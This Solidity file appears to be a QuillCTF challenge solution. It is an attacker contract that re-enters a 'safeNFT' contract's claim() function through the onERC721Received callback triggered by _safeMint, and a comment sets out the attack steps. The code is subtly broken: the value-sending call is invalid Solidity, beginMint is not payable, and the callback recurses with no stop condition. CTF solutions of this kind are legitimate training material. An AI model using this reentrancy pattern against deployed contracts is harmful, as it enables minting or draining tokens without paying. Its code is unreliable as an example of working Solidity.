pragma solidity ^0.8.7;

import "../src/quillctf4.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/* On the original contract, OZ reference of _safemint() function is implemented, it has a function
called checkOnERC721Received(), 

it will make an external call to the receiver contract, since receiver contract has the power 
to accept or reject the NFT, 

if the receiver contract is a malicous contract 
it can implement its own logic and can "reenter" itself again and again.

Vulnerability: Reentrancy:

Attack steps:
1)Create a attacker contract
2) Attacker will first call the beginMint() function
3) It will first call the buyNFT() from the original contract
4) canClaim[msg.sender] will become true
5) Then It will call claim() function
6) On the claim() function _safeMint() will be called
7) And it will be checking the receiver contract(Malicious contract), whether it is implemented onERC721Received() or not
8) Then onERC721Received() will call the claim() function again and again
9) This process will be repeated
 */


contract Quillctf4 is IERC721Receiver {
  safeNFT safenft;
  

  constructor(address _implementation) {
    safenft = safeNFT(_implementation);
    
  }

  function beginMint() external {
    safenft.buyNFT().send(msg.value);
    safenft.claim();
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) {
    
    safenft.claim();
    
    return this.onERC721Received.selector;
  }
}
